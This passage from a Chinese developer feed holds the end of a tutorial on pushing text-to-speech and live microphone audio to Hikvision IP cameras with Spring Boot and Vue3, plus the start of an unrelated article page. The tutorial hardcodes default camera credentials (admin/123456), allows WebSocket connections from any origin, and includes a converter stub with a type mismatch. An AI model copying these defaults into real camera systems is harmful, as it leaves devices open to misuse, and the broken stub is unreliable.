            RestTemplate <span class="hljs-attr">restTemplate</span> = new RestTemplate()<span class="hljs-comment">;</span>
            HttpHeaders <span class="hljs-attr">headers</span> = new HttpHeaders()<span class="hljs-comment">;</span>
            headers.setBasicAuth(username, password)<span class="hljs-comment">;</span>
            
            HttpEntity&lt;String&gt; <span class="hljs-attr">entity</span> = new HttpEntity&lt;&gt;(headers)<span class="hljs-comment">;</span>
            ResponseEntity&lt;String&gt; <span class="hljs-attr">response</span> = restTemplate.exchange(
                url, HttpMethod.GET, entity, String.class
            )<span class="hljs-comment">;</span>
            
            return response.getBody()<span class="hljs-comment">;</span>
        } catch (Exception e) {
            return null<span class="hljs-comment">;</span>
        }
    }
}
</code></pre>
<h3 data-id="heading-5">4. WebSocket实现实时语音流</h3>
<p><strong>WebSocketConfig.java</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableWebSocket</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebSocketConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebSocketConfigurer</span> {
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">registerWebSocketHandlers</span>(<span class="hljs-params">WebSocketHandlerRegistry registry</span>) {
        registry.<span class="hljs-title function_">addHandler</span>(<span class="hljs-title function_">voiceHandler</span>(), <span class="hljs-string">"/voice"</span>)
                .<span class="hljs-title function_">setAllowedOrigins</span>(<span class="hljs-string">"*"</span>);
    }
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">WebSocketHandler</span> <span class="hljs-title function_">voiceHandler</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VoiceWebSocketHandler</span>();
    }
}
</code></pre>
<p><strong>VoiceWebSocketHandler.java</strong></p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-meta">@Component</span>
public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">VoiceWebSocketHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BinaryWebSocketHandler</span> </span>{
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">VoiceBroadcastService</span> voiceService;
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> void handleBinaryMessage(<span class="hljs-type">WebSocketSession</span> session, <span class="hljs-type">BinaryMessage</span> message) {
        <span class="hljs-comment">// 接收前端发送的音频流，转发给摄像头</span>
        <span class="hljs-type">ByteBuffer</span> payload = message.getPayload();
        byte[] audioData = <span class="hljs-keyword">new</span> byte[payload.remaining()];
        payload.get(audioData);
        
        <span class="hljs-comment">// 这里实现将音频流发送给摄像头</span>
        voiceService.sendAudioToCamera(audioData);
    }
}
</code></pre>
<h2 data-id="heading-6">三、前端实现（Vue3 + TypeScript）</h2>
<h3 data-id="heading-7">1. 音频录制组件</h3>
<p><strong>VoiceBroadcast.vue</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"voice-broadcast"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 文本喊话 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"mode === 'text'"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">el-input</span>
        <span class="hljs-attr">v-model</span>=<span class="hljs-string">"textMessage"</span>
        <span class="hljs-attr">type</span>=<span class="hljs-string">"textarea"</span>
        <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"输入要喊话的内容"</span>
        <span class="hljs-attr">:rows</span>=<span class="hljs-string">"4"</span>
      /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"sendText"</span> <span class="hljs-attr">:loading</span>=<span class="hljs-string">"loading"</span>&gt;</span>
        发送喊话
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 实时语音 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-else</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> 
        @<span class="hljs-attr">mousedown</span>=<span class="hljs-string">"startRecording"</span>
        @<span class="hljs-attr">mouseup</span>=<span class="hljs-string">"stopRecording"</span>
        <span class="hljs-attr">:disabled</span>=<span class="hljs-string">"recording"</span>
        <span class="hljs-attr">type</span>=<span class="hljs-string">"primary"</span>
        <span class="hljs-attr">size</span>=<span class="hljs-string">"large"</span>
      &gt;</span>
        🎤 {{ recording ? '正在喊话...' : '按住说话' }}
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
      
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"recordingTime &gt; 0"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"recording-indicator"</span>&gt;</span>
        录音时长: {{ recordingTime }}秒
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 模式切换 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mode-switch"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">el-radio-group</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"mode"</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"small"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">el-radio-button</span> <span class="hljs-attr">label</span>=<span class="hljs-string">"text"</span>&gt;</span>文本喊话<span class="hljs-tag">&lt;/<span class="hljs-name">el-radio-button</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">el-radio-button</span> <span class="hljs-attr">label</span>=<span class="hljs-string">"voice"</span>&gt;</span>实时语音<span class="hljs-tag">&lt;/<span class="hljs-name">el-radio-button</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-radio-group</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 设备选择 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"device-select"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">el-select</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"selectedCamera"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"选择摄像头"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">el-option</span>
          <span class="hljs-attr">v-for</span>=<span class="hljs-string">"camera in cameras"</span>
          <span class="hljs-attr">:key</span>=<span class="hljs-string">"camera.id"</span>
          <span class="hljs-attr">:label</span>=<span class="hljs-string">"camera.name"</span>
          <span class="hljs-attr">:value</span>=<span class="hljs-string">"camera.ip"</span>
        /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-select</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, onMounted, onUnmounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ElMessage</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'element-plus'</span>
<span class="hljs-keyword">import</span> { textToSpeech, startVoiceStream, stopVoiceStream } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/api/broadcast'</span>

<span class="hljs-comment">// 状态</span>
<span class="hljs-keyword">const</span> mode = ref&lt;<span class="hljs-string">'text'</span> | <span class="hljs-string">'voice'</span>&gt;(<span class="hljs-string">'text'</span>)
<span class="hljs-keyword">const</span> textMessage = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)
<span class="hljs-keyword">const</span> selectedCamera = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)
<span class="hljs-keyword">const</span> cameras = ref&lt;any[]&gt;([])
<span class="hljs-keyword">const</span> loading = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)
<span class="hljs-keyword">const</span> recording = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)
<span class="hljs-keyword">const</span> recordingTime = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)
<span class="hljs-keyword">let</span> <span class="hljs-attr">recorder</span>: <span class="hljs-title class_">MediaRecorder</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">audioChunks</span>: <span class="hljs-title class_">Blob</span>[] = []
<span class="hljs-keyword">let</span> <span class="hljs-attr">timer</span>: number | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">ws</span>: <span class="hljs-title class_">WebSocket</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>

<span class="hljs-comment">// 发送文本喊话</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">sendText</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (!textMessage.<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>()) {
    <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">warning</span>(<span class="hljs-string">'请输入喊话内容'</span>)
    <span class="hljs-keyword">return</span>
  }
  
  <span class="hljs-keyword">if</span> (!selectedCamera.<span class="hljs-property">value</span>) {
    <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">warning</span>(<span class="hljs-string">'请选择摄像头'</span>)
    <span class="hljs-keyword">return</span>
  }
  
  loading.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">textToSpeech</span>(selectedCamera.<span class="hljs-property">value</span>, textMessage.<span class="hljs-property">value</span>)
    <span class="hljs-keyword">if</span> (res.<span class="hljs-property">success</span>) {
      <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">'喊话发送成功'</span>)
      textMessage.<span class="hljs-property">value</span> = <span class="hljs-string">''</span>
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'喊话失败'</span>)
    }
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'发送失败'</span>)
  } <span class="hljs-keyword">finally</span> {
    loading.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
  }
}

<span class="hljs-comment">// 开始录音</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">startRecording</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> stream = <span class="hljs-keyword">await</span> navigator.<span class="hljs-property">mediaDevices</span>.<span class="hljs-title function_">getUserMedia</span>({ 
      <span class="hljs-attr">audio</span>: {
        <span class="hljs-attr">sampleRate</span>: <span class="hljs-number">8000</span>, <span class="hljs-comment">// 8kHz适合语音</span>
        <span class="hljs-attr">channelCount</span>: <span class="hljs-number">1</span>,
        <span class="hljs-attr">echoCancellation</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">noiseSuppression</span>: <span class="hljs-literal">true</span>
      }
    })
    
    recorder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MediaRecorder</span>(stream, {
      <span class="hljs-attr">mimeType</span>: <span class="hljs-string">'audio/webm;codecs=opus'</span> <span class="hljs-comment">// 或 'audio/ogg;codecs=opus'</span>
    })
    
    recorder.<span class="hljs-property">ondataavailable</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (event.<span class="hljs-property">data</span>.<span class="hljs-property">size</span> &gt; <span class="hljs-number">0</span>) {
        audioChunks.<span class="hljs-title function_">push</span>(event.<span class="hljs-property">data</span>)
        <span class="hljs-comment">// 通过WebSocket发送音频数据</span>
        <span class="hljs-title function_">sendAudioData</span>(event.<span class="hljs-property">data</span>)
      }
    }
    
    recorder.<span class="hljs-title function_">start</span>(<span class="hljs-number">100</span>) <span class="hljs-comment">// 每100ms发送一次数据</span>
    recording.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
    recordingTime.<span class="hljs-property">value</span> = <span class="hljs-number">0</span>
    
    <span class="hljs-comment">// 计时器</span>
    timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
      recordingTime.<span class="hljs-property">value</span>++
    }, <span class="hljs-number">1000</span>)
    
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'无法访问麦克风'</span>)
  }
}

<span class="hljs-comment">// 停止录音</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">stopRecording</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (recorder &amp;&amp; recording.<span class="hljs-property">value</span>) {
    recorder.<span class="hljs-title function_">stop</span>()
    recorder.<span class="hljs-property">stream</span>.<span class="hljs-title function_">getTracks</span>().<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">track</span> =&gt;</span> track.<span class="hljs-title function_">stop</span>())
    recording.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
    
    <span class="hljs-keyword">if</span> (timer) {
      <span class="hljs-built_in">clearInterval</span>(timer)
      timer = <span class="hljs-literal">null</span>
    }
    
    <span class="hljs-comment">// 关闭WebSocket连接</span>
    <span class="hljs-keyword">if</span> (ws) {
      ws.<span class="hljs-title function_">close</span>()
      ws = <span class="hljs-literal">null</span>
    }
  }
}

<span class="hljs-comment">// 通过WebSocket发送音频数据</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">sendAudioData</span> = (<span class="hljs-params">audioBlob: Blob</span>) =&gt; {
  <span class="hljs-keyword">if</span> (!ws) {
    <span class="hljs-comment">// 建立WebSocket连接</span>
    ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">`ws://<span class="hljs-subst">${location.host}</span>/voice?cameraIp=<span class="hljs-subst">${selectedCamera.value}</span>`</span>)
    
    ws.<span class="hljs-property">onopen</span> = <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'WebSocket连接已建立'</span>)
    }
    
    ws.<span class="hljs-property">onerror</span> = <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'WebSocket错误:'</span>, error)
    }
  }
  
  <span class="hljs-comment">// 转换为ArrayBuffer发送</span>
  <span class="hljs-keyword">const</span> reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>()
  reader.<span class="hljs-property">onload</span> = <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (ws &amp;&amp; ws.<span class="hljs-property">readyState</span> === <span class="hljs-title class_">WebSocket</span>.<span class="hljs-property">OPEN</span>) {
      ws.<span class="hljs-title function_">send</span>(reader.<span class="hljs-property">result</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">ArrayBuffer</span>)
    }
  }
  reader.<span class="hljs-title function_">readAsArrayBuffer</span>(audioBlob)
}

<span class="hljs-comment">// 加载摄像头列表</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">loadCameras</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// 这里调用API获取摄像头列表</span>
  cameras.<span class="hljs-property">value</span> = [
    { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'大门摄像头'</span>, <span class="hljs-attr">ip</span>: <span class="hljs-string">'192.168.1.100'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'停车场摄像头'</span>, <span class="hljs-attr">ip</span>: <span class="hljs-string">'192.168.1.101'</span> }
  ]
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">loadCameras</span>()
})

<span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (recorder) {
    recorder.<span class="hljs-title function_">stop</span>()
  }
  <span class="hljs-keyword">if</span> (ws) {
    ws.<span class="hljs-title function_">close</span>()
  }
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.voice-broadcast</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">max-width</span>: <span class="hljs-number">500px</span>;
  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;
}

<span class="hljs-selector-class">.recording-indicator</span> {
  <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">10px</span>;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#f56c6c</span>;
  <span class="hljs-attribute">font-weight</span>: bold;
  <span class="hljs-attribute">animation</span>: blink <span class="hljs-number">1s</span> infinite;
}

<span class="hljs-keyword">@keyframes</span> blink {
  <span class="hljs-number">0%</span>, <span class="hljs-number">100%</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; }
  <span class="hljs-number">50%</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.5</span>; }
}

<span class="hljs-selector-class">.mode-switch</span>, <span class="hljs-selector-class">.device-select</span> {
  <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h3 data-id="heading-8">2. API接口封装</h3>
<p><strong>broadcast.ts</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> request <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils/request'</span>

<span class="hljs-comment">// 文本转语音喊话</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">textToSpeech</span> = (<span class="hljs-params">cameraIp: <span class="hljs-built_in">string</span>, text: <span class="hljs-built_in">string</span></span>) =&gt; {
  <span class="hljs-keyword">return</span> request.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/broadcast/text-to-speech'</span>, {
    cameraIp,
    text
  })
}

<span class="hljs-comment">// 开始语音流</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">startVoiceStream</span> = (<span class="hljs-params">cameraIp: <span class="hljs-built_in">string</span></span>) =&gt; {
  <span class="hljs-keyword">return</span> request.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/broadcast/voice/start'</span>, { cameraIp })
}

<span class="hljs-comment">// 停止语音流</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">stopVoiceStream</span> = (<span class="hljs-params">cameraIp: <span class="hljs-built_in">string</span></span>) =&gt; {
  <span class="hljs-keyword">return</span> request.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/broadcast/voice/stop'</span>, { cameraIp })
}

<span class="hljs-comment">// 获取摄像头列表</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">getCameras</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">return</span> request.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/cameras'</span>)
}
</code></pre>
<h2 data-id="heading-9">四、配置说明</h2>
<h3 data-id="heading-10">application.yml</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">hikvision:</span>
  <span class="hljs-attr">default-username:</span> <span class="hljs-string">admin</span>
  <span class="hljs-attr">default-password:</span> <span class="hljs-number">123456</span>
  <span class="hljs-attr">isapi-port:</span> <span class="hljs-number">80</span>
  <span class="hljs-attr">audio:</span>
    <span class="hljs-attr">format:</span> <span class="hljs-string">G711</span>  <span class="hljs-comment"># 音频格式：G711, G726, AAC</span>
    <span class="hljs-attr">sample-rate:</span> <span class="hljs-number">8000</span>
</code></pre>
<h2 data-id="heading-11">五、音频格式转换工具类</h2>
<p><strong>AudioConverter.java</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">@Component
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AudioConverter</span> {
    
    <span class="hljs-comment">/**
     * 将文本转为语音音频
     * 需要集成TTS引擎，如讯飞、百度、阿里云等
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] <span class="hljs-built_in">textToAudio</span>(<span class="hljs-type">String</span> text, AudioFormat format) {
        <span class="hljs-comment">// 这里调用第三方TTS服务</span>
        <span class="hljs-comment">// 1. 调用TTS API获取音频流</span>
        <span class="hljs-comment">// 2. 转换为摄像头支持的格式（G.711/G.726）</span>
        <span class="hljs-comment">// 3. 返回音频字节数组</span>
        
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">convertToG711</span>(text);
    }
    
    <span class="hljs-comment">/**
     * PCM转G.711
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] <span class="hljs-built_in">convertToG711</span>(<span class="hljs-type">byte</span>[] pcmData) {
        <span class="hljs-comment">// 实现PCM到G.711的转换逻辑</span>
        <span class="hljs-comment">// 可以使用Jave、FFmpeg等库</span>
        <span class="hljs-keyword">return</span> pcmData;
    }
}
</code></pre>
<h2 data-id="heading-12">六、安全注意事项</h2>
<ol>
<li><strong>认证加密</strong>：使用HTTPS和WSS协议</li>
<li><strong>权限控制</strong>：限制用户喊话权限</li>
<li><strong>频率限制</strong>：防止恶意频繁喊话</li>
<li><strong>日志记录</strong>：记录所有喊话操作</li>
<li><strong>音频压缩</strong>：减少带宽占用</li>
</ol>
<h2 data-id="heading-13">七、常见问题解决</h2>
<ol>
<li><strong>编码格式问题</strong>：确保音频格式为摄像头支持的格式</li>
<li><strong>网络延迟</strong>：使用UDP协议传输实时音频</li>
<li><strong>兼容性问题</strong>：不同型号摄像头API可能有差异</li>
<li><strong>防火墙</strong>：确保端口（8000, 554, 80）开放</li>
</ol>
<p>这个方案提供了两种喊话方式：文本转语音和实时语音。文本转语音更简单稳定，实时语音体验更好但实现复杂度高。您可以根据实际需求选择合适的方案。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[开发者 | 2025 智能驾驶开发者系列培训在京顺利召开！]]></title>    <link>https://juejin.cn/post/7580278296837144610</link>    <guid>https://juejin.cn/post/7580278296837144610</guid>    <pubDate>2025-12-06T07:27:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580278296837144610" data-draft-id="7580210602079256610" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="开发者 | 2025 智能驾驶开发者系列培训在京顺利召开！"/> <meta itemprop="keywords" content="自动驾驶"/> <meta itemprop="datePublished" content="2025-12-06T07:27:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="地平线开发者"/> <meta itemprop="url" content="https://juejin.cn/user/1257497032132567"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            开发者 | 2025 智能驾驶开发者系列培训在京顺利召开！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1257497032132567/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    地平线开发者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T07:27:03.000Z" title="Sat Dec 06 2025 07:27:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li 